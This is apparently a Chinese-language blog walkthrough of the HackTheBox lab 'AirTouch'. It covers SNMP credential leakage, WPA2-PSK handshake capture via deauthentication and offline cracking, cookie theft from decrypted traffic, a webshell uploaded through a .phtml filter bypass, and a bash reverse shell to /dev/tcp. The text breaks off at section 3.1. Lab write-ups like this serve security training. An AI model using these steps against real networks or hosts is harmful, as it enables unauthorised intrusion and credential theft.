@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="1. Initial Access1.1 端口扫描对目标机器进行端口扫描和服务扫描，首先进行TCP半连接扫描。 扫描结果中只有一个22&#x2F;SSH端口开放，需要继续进行UDP扫描。 1nmap -sC -sV --min-rate&#x3D;10000 -p- -O -oN .&#x2F;nmap&#x2F;airtouch-tcp.nmap 10.129.244.98   对目标机器进行UDP扫描：由于UDP扫描是无连">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox Machine AirTouch">
+<meta property="og:url" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1. Initial Access1.1 端口扫描对目标机器进行端口扫描和服务扫描，首先进行TCP半连接扫描。 扫描结果中只有一个22&#x2F;SSH端口开放，需要继续进行UDP扫描。 1nmap -sC -sV --min-rate&#x3D;10000 -p- -O -oN .&#x2F;nmap&#x2F;airtouch-tcp.nmap 10.129.244.98   对目标机器进行UDP扫描：由于UDP扫描是无连">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772204512291.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772212883307.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772205209986.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772205391554.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772205503465.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772205904862.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772205946887.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772205980601.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772206272243.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772206603831.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772206734827.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772206820554.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772207046759.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772207146480.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772207497759.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772207561499.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772207710408.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772207755621.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772208377352.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772208566004.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772208715120.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772208790186.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772208886762.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772208940313.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772209172473.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772209207231.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772209319309.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772209452621.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772209544286.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772209742851.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772209783210.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772210563504.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772210639639.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772210896768.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772211407802.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772210967764.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772211791097.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772211909937.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772212098597.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772212143452.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772212211340.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772212264033.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772212584957.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772212559125.png">
+<meta property="og:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772212640133.png">
+<meta property="article:published_time" content="2026-02-27T14:47:37.000Z">
+<meta property="article:modified_time" content="2026-02-27T17:21:24.629Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="snmp">
+<meta property="article:tag" content="ssh">
+<meta property="article:tag" content="traffic">
+<meta property="article:tag" content="upload">
+<meta property="article:tag" content="wifi">
+<meta property="article:tag" content="wpa2-enterprise">
+<meta property="article:tag" content="wpa2-psk cracking">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/1772204512291.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox Machine AirTouch</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/02/25/PortSwigger-Command-Injection/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&text=HackTheBox Machine AirTouch"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&title=HackTheBox Machine AirTouch"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&is_video=false&description=HackTheBox Machine AirTouch"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox Machine AirTouch&body=Check out this article: http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&title=HackTheBox Machine AirTouch"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&title=HackTheBox Machine AirTouch"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&title=HackTheBox Machine AirTouch"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&title=HackTheBox Machine AirTouch"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&name=HackTheBox Machine AirTouch&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/27/HackTheBox-Machine-AirTouch/&t=HackTheBox Machine AirTouch"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Initial-Access"><span class="toc-number">1.</span> <span class="toc-text">1. Initial Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-SNMP%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 SNMP凭证泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-AirTouch-Internet"><span class="toc-number">2.</span> <span class="toc-text">2. AirTouch-Internet</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-WPA2-PSK-Cracking"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 WPA2-PSK Cracking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-SSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 SSH本地端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E6%B5%81%E9%87%8F%E5%8C%85%E6%B3%84%E9%9C%B2Cookie"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 流量包泄露Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87RCE"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 文件上传绕过RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-PHP%E8%84%9A%E6%9C%AC%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 PHP脚本凭证泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-AirTouch-Office"><span class="toc-number">3.</span> <span class="toc-text">3. AirTouch-Office</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-WPA2-Enterprise"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 WPA2-Enterprise</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Hostapd%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 Hostapd凭证泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%80%BB%E7%BB%93%E6%80%9D%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">4. 总结思考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-SNMP%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 SNMP凭证泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-WPA2-PSK-Cracking"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 WPA2-PSK Cracking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-WPA2-Enterprise"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 WPA2-Enterprise</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox Machine AirTouch
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-02-27T14:47:37.000Z" class="dt-published" itemprop="datePublished">2026-02-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/snmp/" rel="tag">snmp</a>, <a class="p-category" href="/tags/ssh/" rel="tag">ssh</a>, <a class="p-category" href="/tags/traffic/" rel="tag">traffic</a>, <a class="p-category" href="/tags/upload/" rel="tag">upload</a>, <a class="p-category" href="/tags/wifi/" rel="tag">wifi</a>, <a class="p-category" href="/tags/wpa2-enterprise/" rel="tag">wpa2-enterprise</a>, <a class="p-category" href="/tags/wpa2-psk-cracking/" rel="tag">wpa2-psk cracking</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="1-Initial-Access"><a href="#1-Initial-Access" class="headerlink" title="1. Initial Access"></a>1. Initial Access</h2><h3 id="1-1-端口扫描"><a href="#1-1-端口扫描" class="headerlink" title="1.1 端口扫描"></a>1.1 端口扫描</h3><p>对目标机器进行端口扫描和服务扫描，首先进行TCP半连接扫描。</p>
+<p>扫描结果中只有一个22&#x2F;SSH端口开放，需要继续进行UDP扫描。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV --min-rate=10000 -p- -O -oN ./nmap/airtouch-tcp.nmap 10.129.244.98</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772204512291.png" alt="1772204512291"></p>
+<p>对目标机器进行UDP扫描：由于UDP扫描是无连接的，需要等待ICMP返回端口不可达，扫描速率很慢。</p>
+<p>发现目标机器开放161&#x2F;SNMP端口。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -v -oN ./nmap/airtouch-udp.nmap 10.129.244.98</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772212883307.png" alt="1772212883307"></p>
+<h3 id="1-2-SNMP凭证泄露"><a href="#1-2-SNMP凭证泄露" class="headerlink" title="1.2 SNMP凭证泄露"></a>1.2 SNMP凭证泄露</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/SECFORCE/SNMP-Brute">SNMP-Brute</a>爆破SNMP协议的社区字符串为<code>public</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python snmpbrute.py -t 10.129.244.98</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772205209986.png" alt="1772205209986"></p>
+<p>继续用snmpwalk读取目标设备信息，得到<code>consultant:RxBlZhLmOkacNWScmZ6D</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 2c -c public 10.129.244.98</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772205391554.png" alt="1772205391554"></p>
+<p>使用上面得到的凭据进行连接。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh consultant@10.129.244.98</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772205503465.png" alt="1772205503465"></p>
+<h2 id="2-AirTouch-Internet"><a href="#2-AirTouch-Internet" class="headerlink" title="2. AirTouch-Internet"></a>2. AirTouch-Internet</h2><h3 id="2-1-WPA2-PSK-Cracking"><a href="#2-1-WPA2-PSK-Cracking" class="headerlink" title="2.1 WPA2-PSK Cracking"></a>2.1 WPA2-PSK Cracking</h3><p>查看sudo权限设置，发现当前用户可以无密码以root执行任何命令，切换到root用户。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772205904862.png" alt="1772205904862"></p>
+<p>查看所有的无线网卡配置信息：有很多张无线网卡处于Managed模式，但是都没有连接Wifi。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772205946887.png" alt="1772205946887"></p>
+<p>将wlan0网卡从Managed模式启动为Monitor模式。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772205980601.png" alt="1772205980601"></p>
+<p>利用上面启动为Monitor模式的无线网卡进行扫描。</p>
+<p>从扫描结果发现有5个AP设备和3个客户端设备，其中有一台客户端设备连接了AirTouch-Internet。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772206272243.png" alt="1772206272243"></p>
+<p>对名为AirTouch-Internet的AP进行监听，设置监听信道6。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng --bssid F0:9F:C2:A3:F1:A7 --channel 6 -w handshake wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772206603831.png" alt="1772206603831"></p>
+<p>设置信道6，发送Deauth攻击，并设置发包网卡为wlan1。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iwconfig wlan1 channel 6</span><br><span class="line">aireplay-ng --ignore-negative-one -0 10 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772206734827.png" alt="1772206734827"></p>
+<p>用字典对抓到的WPA握手包进行离线爆破，得到了AP的连接密码为<code>challenge</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w /root/eaphammer/wordlists/rockyou.txt -b F0:9F:C2:A3:F1:A7 handshake-01.cap</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772206820554.png" alt="1772206820554"></p>
+<p>现在生成配置并连接AirTouch-Internet网络。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpa_passphrase &quot;AirTouch-Internet&quot; &quot;challenge&quot; &gt; AirTouch-Internet.conf</span><br><span class="line">wpa_supplicant -B -i wlan1 -c AirTouch-Internet.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772207046759.png" alt="1772207046759"></p>
+<p>请求AP使用DHCP协议为当前机器分配IP地址。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dhclient wlan1</span><br><span class="line">ifconfig wlan1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772207146480.png" alt="1772207146480"></p>
+<h3 id="2-2-SSH本地端口转发"><a href="#2-2-SSH本地端口转发" class="headerlink" title="2.2 SSH本地端口转发"></a>2.2 SSH本地端口转发</h3><p>首先对192.168.3.0&#x2F;24网段进行ICMP扫描。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.3.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772207497759.png" alt="1772207497759"></p>
+<p>继续对192.168.3.1地址进行TCP全端口扫描。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- -O 192.168.3.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772207561499.png" alt="1772207561499"></p>
+<p>通过SSH本地端口转发，将攻击机的7777端口流量通过SSH隧道转发到192.168.3.1的80端口。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNf -L 7777:192.168.3.1:80 consultant@10.129.244.98</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772207710408.png" alt="1772207710408"></p>
+<p>这时候访问本地的7777端口即可访问到内网的Web服务。</p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772207755621.png" alt="1772207755621"></p>
+<h3 id="2-3-流量包泄露Cookie"><a href="#2-3-流量包泄露Cookie" class="headerlink" title="2.3 流量包泄露Cookie"></a>2.3 流量包泄露Cookie</h3><p>简单对Web站点枚举并做目录扫描，除了登录界面，只有一个上传目录。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://127.0.0.1:7777/ -x 403</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772208377352.png" alt="1772208377352"></p>
+<p>大致知道了登录上去之后应该有一个上传页面，现在需要突破认证限制。</p>
+<p>有两种思路，第一种是正面利用，比如弱口令、SQL注入等，第二种则是通过钓鱼等手段侧面利用。</p>
+<p>而在做WPA2-PSK Cracking攻击时，监听过一段时间流量包，将流量包传输到本地。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r consultant@10.129.244.98:/tmp/handshake-01.cap /root/Desktop</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772208566004.png" alt="1772208566004"></p>
+<p>打开流量包后首先要做的是解密流量包，设置解密Key为<code>challenge:AirTouch-Internet</code>。</p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772208715120.png" alt="1772208715120"></p>
+<p>其中有一些为http流量，其中泄露了有效的用户Cookie。</p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772208790186.png" alt="1772208790186"></p>
+<p>用上面的Cookie登录站点成功。</p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772208886762.png" alt="1772208886762"></p>
+<p>修改UserRole为admin，成功进入管理员界面，可以进行文件上传。</p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772208940313.png" alt="1772208940313"></p>
+<h3 id="2-4-文件上传绕过RCE"><a href="#2-4-文件上传绕过RCE" class="headerlink" title="2.4 文件上传绕过RCE"></a>2.4 文件上传绕过RCE</h3><p>这是个PHP站点，需要绕过限制上传WebShell，直接上传失败。</p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772209172473.png" alt="1772209172473"></p>
+<p>修改文件为phtml之后上传成功。</p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772209207231.png" alt="1772209207231"></p>
+<p>访问该Webshell进行命令执行，命令执行成功。</p>
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772209319309.png" alt="1772209319309"></p>
+<p>在当前机器监听，在目标Web服务器上反弹Shell得到一个伪Shell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.3.23/8888 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772209452621.png" alt="1772209452621"></p>
+<h3 id="2-5-PHP脚本凭证泄露"><a href="#2-5-PHP脚本凭证泄露" class="headerlink" title="2.5 PHP脚本凭证泄露"></a>2.5 PHP脚本凭证泄露</h3><p>在login.php中泄露了两组凭据。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user:JunDRDZKHDnpkpDDvay</span><br><span class="line">manager:2wLFYNh4TSTgA5sNgT4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772209544286.png" alt="1772209544286"></p>
+<p>使用user用户SSH连接成功。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@192.168.3.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772209742851.png" alt="1772209742851"></p>
+<p>之后直接利用sudo命令切换到root用户。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/27/HackTheBox-Machine-AirTouch/1772209783210.png" alt="1772209783210"></p>
+<h2 id="3-AirTouch-Office"><a href="#3-AirTouch-Office" class="headerlink" title="3. AirTouch-Office"></a>3. AirTouch-Office</h2><h3 id="3-1-WPA2-Enterprise"><a href="#3-1-WPA2-Enterprise" class="headerlink" title="3.1 WPA2-Enterprise"></a>3.1 WPA2-Enterprise</h3><p>在上面AirTouch-Internet的AP机器中，发现了send_certs.sh。</p>
